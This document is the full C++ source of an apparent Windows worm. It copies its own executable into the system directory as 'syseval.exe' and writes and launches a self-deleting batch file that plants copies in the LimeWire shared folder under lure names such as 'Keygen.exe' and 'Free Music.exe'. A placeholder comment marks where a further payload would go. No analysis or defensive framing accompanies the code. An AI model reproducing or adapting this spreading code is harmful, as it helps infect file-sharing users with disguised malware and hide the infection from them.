   #include <windows.h>
   #include <iostream>
   #include <fstream>
   using namespace std;

   int main (){
     char system[MAX_PATH];
   char pathtofile[MAX_PATH];
   HMODULE GetModH = GetModuleHandle(NULL);

   GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
   GetSystemDirectory(system,sizeof(system));

   strcat(system,"\\syseval.exe");

   CopyFile(pathtofile,system,false);

   ofstream myfile;
     myfile.open ("C:\\spread.bat");
     myfile << "@echo off\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Free Music.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\ScreenSaver.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Naked!.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\FREE$$$.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Hacking Ebook.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Fast Money.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\LimewireCDCrack.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Keygen.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Money.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\XXXDownloader.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\Free Babes.exe\"\n";
     myfile << "copy \"C:\\WINDOWS\\system32\\syseval.exe\" \"C:\\Progra~1\\LimeWire\\$$$.exe\"\n";
     myfile << "del %0\n";
     myfile << "exit\n";
     myfile.close();
     char Spreadstart[MAX_PATH]="C:\\spread.bat";
   ShellExecute(NULL,"open",Spreadstart,NULL,NULL,SW_MAXIMIZE);

   //Payload Here

     return 0;
   }
